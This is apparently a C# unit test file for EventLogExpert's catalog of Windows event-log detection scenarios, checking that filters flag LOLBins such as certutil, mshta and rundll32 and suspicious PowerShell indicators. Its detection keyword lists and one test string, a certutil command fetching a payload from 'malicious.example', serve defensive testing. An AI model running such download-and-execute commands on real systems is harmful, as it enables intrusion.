// // Copyright (c) Microsoft Corporation.
// // Licensed under the MIT License.

using EventLogExpert.Eventing.Common.Channels;
using EventLogExpert.Eventing.Common.Events;
using EventLogExpert.Eventing.TestUtils;
using EventLogExpert.Filtering.Basic;
using EventLogExpert.Filtering.Common.Filtering;
using EventLogExpert.Filtering.Evaluation;
using EventLogExpert.Filtering.Persistence;
using EventLogExpert.Scenarios.Catalog;

namespace EventLogExpert.Scenarios.Tests;

public sealed class BuiltInCatalogValidationTests
{
    private static readonly BuiltInScenarioRegistry s_registry = new([new BuiltInScenarioSource()]);

    public static TheoryData<string> AllScenarioIds()
    {
        var data = new TheoryData<string>();

        foreach (var scenario in s_registry.Scenarios) { data.Add(scenario.Id); }

        return data;
    }

    [Fact]
    public void Catalog_IdsAreUniqueAndKebabCase()
    {
        var ids = s_registry.Scenarios.Select(scenario => scenario.Id).ToList();

        Assert.Equal(ids.Count, ids.Distinct(StringComparer.OrdinalIgnoreCase).Count());
        Assert.All(ids, id => Assert.Matches("^[a-z0-9]+(-[a-z0-9]+)*$", id));
    }

    [Fact]
    public void Catalog_LoadsWithScenarios()
    {
        Assert.NotEmpty(s_registry.Scenarios);
    }

    [Fact]
    public void Catalog_StableGuidsAreUnique()
    {
        var guids = s_registry.Scenarios.Select(scenario => scenario.StableGuid).ToList();

        Assert.Equal(guids.Count, guids.Distinct().Count());
        Assert.DoesNotContain(Guid.Empty, guids);
    }

    // The companion negative: a benign line-of-business process/command matches no row of any collapsed scenario, proving
    // the Contains-Any needle lists did not widen into a catch-all during the collapse.
    [Theory]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image")]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine")]
    public void CollapsedContainsAnyScenario_BenignPayload_MatchesNoRow(string scenarioId, int eventId, string field)
    {
        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId));
        var benign = EventDataTestFactory.CreateEventWithData((field, @"C:\Program Files\Contoso\LineOfBusinessApp.exe"))
            with { Id = eventId };

        Assert.DoesNotContain(filterSet, saved => saved.Compiled!.Predicate(benign));
    }

    // Pins the collapsed row count so a future edit that re-expands a tier into individual rows (or adds a stray row)
    // fails loudly rather than silently passing the substring-based behavioral test.
    [Theory]
    [InlineData("lolbin-process-creation-by-name", 3)]
    [InlineData("sysmon-lolbin-initiated-network", 3)]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 3)]
    [InlineData("encoded-powershell-commandline-field", 1)]
    [InlineData("lolbin-in-process-command-line", 1)]
    public void CollapsedContainsAnyScenario_HasExpectedRowCount(string scenarioId, int expectedRows)
    {
        var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId);

        Assert.Equal(expectedRows, scenario.Filters.Length);
    }

    // Behavioral regression guard for the EventData Contains-Any scenario collapse: every needle that was formerly its own
    // Contains row must still match, carrying the SAME tier color, and no other tier may match (tiers are disjoint by
    // needle). A misspelled needle in the refactored JSON fails here because the correctly-spelled payload cannot match a
    // mistyped filter needle - a defect that catalog compile/round-trip validation cannot detect.
    [Theory]
    // lolbin-process-creation-by-name (Security 4688, NewProcessName): DarkRed / Red / Orange tiers.
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "mshta.exe", "DarkRed")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "wscript.exe", "DarkRed")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "cscript.exe", "DarkRed")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "rundll32.exe", "Red")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "regsvr32.exe", "Red")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "installutil.exe", "Red")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "certutil.exe", "Orange")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "bitsadmin.exe", "Orange")]
    [InlineData("lolbin-process-creation-by-name", 4688, "NewProcessName", "wmic.exe", "Orange")]
    // sysmon-lolbin-initiated-network (Sysmon 3, Image): DarkRed / Red / Orange tiers.
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "mshta.exe", "DarkRed")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "wscript.exe", "DarkRed")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "cscript.exe", "DarkRed")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "powershell.exe", "Red")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "pwsh.exe", "Red")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "rundll32.exe", "Orange")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "regsvr32.exe", "Orange")]
    [InlineData("sysmon-lolbin-initiated-network", 3, "Image", "certutil.exe", "Orange")]
    // suspicious-ps-scriptblock-ioc-triage (PowerShell 4104, ScriptBlockText): Red / Orange content tiers (the Blue row
    // keys on Level, not a needle, so it is covered by the Level-defaulting-empty non-match implicitly).
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "FromBase64String", "Red")]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "Invoke-Expression", "Red")]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "DownloadString", "Orange")]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "New-Object Net.WebClient", "Orange")]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 4104, "ScriptBlockText", "Reflection.Assembly]::Load", "Orange")]
    // encoded-powershell-commandline-field (Security 4688, CommandLine): single uncolored (None) row.
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-EncodedCommand", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-enc ", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "FromBase64String", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "IEX", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "DownloadString", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-w hidden", "None")]
    [InlineData("encoded-powershell-commandline-field", 4688, "CommandLine", "-nop", "None")]
    // lolbin-in-process-command-line (Security 4688, CommandLine): single uncolored (None) row, proxied-execution companion to lolbin-process-creation-by-name.
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "rundll32", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "regsvr32", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "mshta", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "wmic", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "certutil", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "bitsadmin", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "installutil", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "wscript", "None")]
    [InlineData("lolbin-in-process-command-line", 4688, "CommandLine", "cscript", "None")]
    public void CollapsedContainsAnyScenario_MatchesEveryNeedleWithTierColor(
        string scenarioId,
        int eventId,
        string field,
        string needle,
        string expectedColor)
    {
        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId));
        var expected = Enum.Parse<HighlightColor>(expectedColor);

        // Surround the needle so the match proves substring (Contains) semantics, not an accidental whole-value equality.
        var resolvedEvent = EventDataTestFactory.CreateEventWithData((field, $"lead {needle} tail")) with { Id = eventId };

        Assert.Contains(filterSet, saved => saved.Color == expected && saved.Compiled!.Predicate(resolvedEvent));
        Assert.DoesNotContain(filterSet, saved => saved.Color != expected && saved.Compiled!.Predicate(resolvedEvent));
    }

    // Structural pin for the collapse: every collapsed Contains-Any row must be exactly one Many-mode Contains predicate
    // over the expected EventData field with the EXACT needle array, under the expected tier color and Id gate. The
    // behavioral test above proves matching but (being substring-based) would tolerate a truncated needle (mshta.exe ->
    // mshta.ex) or a tier re-expanded into same-colored single rows; this test rejects both by pinning Values + shape.
    [Theory]
    // lolbin-process-creation-by-name (Security 4688, NewProcessName)
    [InlineData("lolbin-process-creation-by-name", 0, "DarkRed", "4688", "NewProcessName", new[] { "mshta.exe", "wscript.exe", "cscript.exe" })]
    [InlineData("lolbin-process-creation-by-name", 1, "Red", "4688", "NewProcessName", new[] { "rundll32.exe", "regsvr32.exe", "installutil.exe" })]
    [InlineData("lolbin-process-creation-by-name", 2, "Orange", "4688", "NewProcessName", new[] { "certutil.exe", "bitsadmin.exe", "wmic.exe" })]
    // sysmon-lolbin-initiated-network (Sysmon 3, Image)
    [InlineData("sysmon-lolbin-initiated-network", 0, "DarkRed", "3", "Image", new[] { "mshta.exe", "wscript.exe", "cscript.exe" })]
    [InlineData("sysmon-lolbin-initiated-network", 1, "Red", "3", "Image", new[] { "powershell.exe", "pwsh.exe" })]
    [InlineData("sysmon-lolbin-initiated-network", 2, "Orange", "3", "Image", new[] { "rundll32.exe", "regsvr32.exe", "certutil.exe" })]
    // suspicious-ps-scriptblock-ioc-triage (PowerShell 4104, ScriptBlockText) - rows 0/1 are Contains-Any; row 2 is the Level=Warning Blue row.
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 0, "Red", "4104", "ScriptBlockText", new[] { "FromBase64String", "Invoke-Expression" })]
    [InlineData("suspicious-ps-scriptblock-ioc-triage", 1, "Orange", "4104", "ScriptBlockText", new[] { "DownloadString", "New-Object Net.WebClient", "Reflection.Assembly]::Load" })]
    // encoded-powershell-commandline-field (Security 4688, CommandLine) - single uncolored row
    [InlineData("encoded-powershell-commandline-field", 0, "None", "4688", "CommandLine", new[] { "-EncodedCommand", "-enc ", "FromBase64String", "IEX", "DownloadString", "-w hidden", "-nop" })]
    // lolbin-in-process-command-line (Security 4688, CommandLine) - single uncolored row, proxied-execution companion
    [InlineData("lolbin-in-process-command-line", 0, "None", "4688", "CommandLine", new[] { "rundll32", "regsvr32", "mshta", "wmic", "certutil", "bitsadmin", "installutil", "wscript", "cscript" })]
    public void CollapsedContainsAnyScenario_RowIsCanonicalContainsManyOverExactNeedles(
        string scenarioId,
        int rowIndex,
        string color,
        string eventId,
        string field,
        string[] expectedValues)
    {
        var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == scenarioId);
        var row = scenario.Filters[rowIndex];

        Assert.Equal(Enum.Parse<HighlightColor>(color), row.Color);

        // The row is an inclusion (not exclusion) row.
        Assert.False(row.IsExcluded);

        // Root comparison is the single-value Id gate (exactly Id == <eventId>, not a Contains or Many).
        Assert.Equal(EventProperty.Id, row.Filter.Comparison.Property);
        Assert.Equal(ComparisonOperator.Equals, row.Filter.Comparison.Operator);
        Assert.Equal(MatchMode.Single, row.Filter.Comparison.MatchMode);
        Assert.Equal(eventId, row.Filter.Comparison.Value);
        Assert.Empty(row.Filter.Comparison.Values);

        // The one predicate is a Many-mode Contains over the EventData field with EXACTLY the expected needles, in order.
        var comparison = Assert.Single(row.Filter.Predicates).Comparison;
        Assert.Equal(EventProperty.EventData, comparison.Property);
        Assert.Equal(field, comparison.EventDataFieldName);
        Assert.Equal(ComparisonOperator.Contains, comparison.Operator);
        Assert.Equal(MatchMode.Many, comparison.MatchMode);
        Assert.Equal<IEnumerable<string>>(expectedValues, comparison.Values);
    }

    [Fact]
    public void CombinedScenarios_RowsAreLogNameScoped()
    {
        var combined = s_registry.Scenarios.Where(scenario => scenario.Channels.Length > 1).ToList();

        Assert.All(combined, scenario => Assert.All(scenario.Filters, row =>
            Assert.True(
                row.Filter.Comparison.Property is EventProperty.LogName ||
                row.Filter.Predicates.Any(predicate => predicate.Comparison.Property is EventProperty.LogName),
                $"Combined scenario '{scenario.Id}' has a row that is not LogName-scoped.")));
    }

    [Fact]
    public void DescriptionContains_MatchesRealisticEvent()
    {
        var officeSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "office-crashes-hangs"));
        var wordCrash = new ResolvedEvent("Application", LogPathType.Channel)
        {
            LogName = "Application",
            Source = "Application Error",
            Id = 1000,
            Description = "Faulting application name: WINWORD.EXE, version: 16.0.1, time stamp: 0x0"
        };
        Assert.Contains(officeSet, saved => saved.Compiled!.Predicate(wordCrash));
    }

    [Fact]
    public void EncodedPowerShellCommandLine_MatchesEncAbbreviation_ButNotBenignEncodingParameter()
    {
        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "encoded-powershell-commandline-field"));
        var encodedCommand = EventDataTestFactory.CreateEventWithData(("CommandLine", "powershell.exe -enc JABzAGMAcgBpAHAAdAA=")) with { Id = 4688 };
        var benignEncoding = EventDataTestFactory.CreateEventWithData(("CommandLine", "powershell.exe -Command \"Get-Content log.txt -Encoding UTF8\"")) with { Id = 4688 };

        Assert.Contains(filterSet, saved => saved.Compiled!.Predicate(encodedCommand));
        Assert.DoesNotContain(filterSet, saved => saved.Compiled!.Predicate(benignEncoding));
    }

    [Fact]
    public void LolbinInCommandLine_MatchesProxiedInvocation()
    {
        var filterSet = s_registry.BuildFilterSet(s_registry.Scenarios.Single(scenario => scenario.Id == "lolbin-in-process-command-line"));
        var proxied = EventDataTestFactory.CreateEventWithData(("CommandLine", "cmd.exe /c certutil -urlcache -split -f http://malicious.example/x payload.exe")) with { Id = 4688 };

        Assert.Contains(filterSet, saved => saved.Compiled!.Predicate(proxied));
    }

    [Fact]
    public void MultiSourceOrRow_MatchesEachOrTerm()
    {
        var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == "storage-controller-driver-resets");
        var saved = s_registry.BuildFilterSet(scenario).Single();
        Assert.NotNull(saved.Compiled);

        static ResolvedEvent Event(string source, int id) =>
            new("System", LogPathType.Channel) { LogName = "System", Source = source, Id = id };

        Assert.True(saved.Compiled!.Predicate(Event("storahci", 11)), "storahci term should match");
        Assert.True(saved.Compiled!.Predicate(Event("stornvme", 14)), "stornvme term should match");
        Assert.True(saved.Compiled!.Predicate(Event("iaStorA", 129)), "iaStorA term should match");
        Assert.True(saved.Compiled!.Predicate(Event("disk", 153)), "disk term should match");
        Assert.False(saved.Compiled!.Predicate(Event("disk", 11)), "disk with a non-matching id should not match");
        Assert.False(saved.Compiled!.Predicate(Event("storahci", 999)), "storahci with a non-matching id should not match");
        Assert.False(saved.Compiled!.Predicate(Event("Disk", 153)), "Source matching is case-sensitive (Ordinal): the real provider is 'disk', so 'Disk' must not match");
    }

    [Theory]
    [MemberData(nameof(AllScenarioIds))]
    public void Scenario_FilterSet_CompilesCanonicalAndBasic(string id)
    {
        var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == id);

        var filterSet = s_registry.BuildFilterSet(scenario);

        Assert.Equal(scenario.Filters.Length, filterSet.Count);

        Assert.All(filterSet, saved =>
        {
            Assert.NotNull(saved.Compiled);
            Assert.Equal(FilterMode.Basic, saved.Mode);

            var roundTripped = SavedFilter.TryCreate(saved.ComparisonText, basicFilter: null, mode: FilterMode.Basic);

            Assert.NotNull(roundTripped?.BasicFilter);
            Assert.True(BasicFilterFormatter.TryFormat(roundTripped.BasicFilter, strictPredicates: true, out var reformatted));
            Assert.Equal(saved.ComparisonText, reformatted);
        });
    }

    [Theory]
    [MemberData(nameof(AllScenarioIds))]
    public void Scenario_RequiresAdmin_ConsistentWithChannels(string id)
    {
        var scenario = s_registry.Scenarios.Single(scenario => scenario.Id == id);

        if (scenario.Channels.Any(LogChannelNames.AdminOnlyLiveChannels.Contains))
        {
            Assert.True(scenario.RequiresAdmin);
        }
    }
}
